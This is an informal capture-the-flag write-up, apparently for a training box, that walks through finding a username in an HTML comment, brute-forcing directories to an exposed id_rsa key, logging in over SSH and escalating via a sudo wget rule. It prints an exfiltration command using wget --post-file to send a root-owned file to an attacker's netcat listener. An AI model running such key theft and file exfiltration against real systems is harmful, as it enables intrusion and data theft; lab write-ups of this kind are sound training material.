saw all through these website and havent got anything! though that contact page is vuln as it is taking some input but havent got any thing good from that too! so i visited the main site again! 


saw that some part below the "configuration layout for an Apache2 web server installation on Ubuntu systems is as follows‚Äù
is missing so i just visited the source code and this was written there : 


 <!-- Jessie don't forget to udate the webiste -->
 
 so from here i got the username so though that might get me into ssh! by bruteforcing into it! but it didnt worked!
 
 i visited the /sitemap again! and tried the medium wordlist scan! still didnt got anything! then tried the big.txt 
 
 and saw these files were there

aah!! finally! .ssh folder visited there and got the id_rsa file 

now whose ssh key are those???  umm jessie! the user we found earlier

just logged in into the jessie's account

ssh -i id_rsa jessie@ip

and got into the account

did sudo -l

and saw  (root) NOPASSWD: /usr/bin/wget

jessie have this permission visited gtfobins and! 

saw that we can upload any file from the victim pc and download it on the attacker pc like this

LFILE=/root/root_flag.txt
sudo wget --post-file=$LFILE http://$ip:$port

and on the attacker pc did this

nc -lvnp 4343

you will recive the flag

and completed!
